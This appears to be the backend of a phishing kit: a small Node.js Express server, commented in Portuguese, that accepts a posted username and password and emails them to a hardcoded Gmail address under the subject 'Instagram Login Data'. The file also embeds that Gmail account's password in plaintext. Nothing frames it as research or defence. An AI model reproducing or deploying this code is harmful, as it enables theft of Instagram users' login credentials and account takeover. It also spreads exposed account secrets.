// Importar as bibliotecas necessárias  
const express = require('express');  
const nodemailer = require('nodemailer');  
const bodyParser = require('body-parser');  
const cors = require('cors');  

// Criar uma instância do aplicativo Express  
const app = express();  
const PORT = process.env.PORT || 3000; // Define a porta para a aplicação  

// Middleware  
app.use(cors()); // Permitir CORS  
app.use(bodyParser.json()); // Parse JSON no body das requisições  
app.use(bodyParser.urlencoded({ extended: true })); // Parse URL encoded  

// Rota para receber dados do formulário  
app.post('/send-email', (req, res) => {  
    const { username, password } = req.body; // Obter os dados do corpo da requisição  

    // Configurações do transportador de e-mail  
    const transporter = nodemailer.createTransport({  
        service: 'gmail', // O serviço de e-mail que você está usando  
        auth: {  
            user: 'risperidona1234@gmail.com', // Seu email  
            pass: 'riangomes18' // Senha do email ou senha do aplicativo  
        }  
    });  

    // Configuração do e-mail  
    const mailOptions = {  
        from: 'risperidona1234@gmail.com', // De quem é o e-mail  
        to: 'risperidona1234@gmail.com', // Para quem você está enviando  
        subject: 'Dados de Login do Instagram', // Assunto do e-mail  
        text: `Usuário: ${username}\nSenha: ${password}` // Corpo do e-mail  
    };  

    // Enviando o e-mail  
    transporter.sendMail(mailOptions, (error, info) => {  
        if (error) {  
            return res.status(500).send(error.toString()); // Retorna erro caso falhe  
        }  
        res.status(200).send('Email enviado com sucesso: ' + info.response); // Responde ao cliente  
    });  
});  

// Iniciar o servidor  
app.listen(PORT, () => {  
    console.log(`Servidor rodando na porta ${PORT}`);  
});
